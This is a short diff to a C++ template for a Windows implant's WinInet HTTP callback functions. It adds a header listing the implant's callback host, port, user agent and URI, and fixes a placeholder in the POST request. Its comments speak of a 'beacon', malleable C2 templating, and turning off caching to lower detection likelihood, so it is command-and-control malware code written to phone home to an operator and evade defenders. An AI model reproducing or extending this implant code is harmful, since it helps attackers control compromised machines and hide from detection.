@@ -1,6 +1,15 @@
-/*
-Jinja notes: Just completely copy in this file, then run jinja vars on it. 
-*/
+[# 
+Name: WinInet HTTP get/post functions. 
+
+Explanation:... 
+
+Required Keys:
+
+ - http_get_uri: URI of GET endpoint for the implant
+ - http_user_agent: THe user agent used to call back with
+ - callback_host: Host to call back to
+ - callback_port: port to call back to
+#]
 
 #include <windows.h>
 #include <wininet.h>
@@ -113,7 +122,7 @@ bool HTTP_POST(std::string data, std::vector<std::wstring>& headers, std::vector
     HINTERNET hRequest = HttpOpenRequestW(
         hConnect,
         L"[[http_post_verb]]",                // Method - template, mallc2 this
-        L"[http_post_uri]",          // Path - template, mallc2 this
+        L"[[http_post_uri]]",          // Path - template, mallc2 this
         NULL, NULL, NULL,
         INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
         0
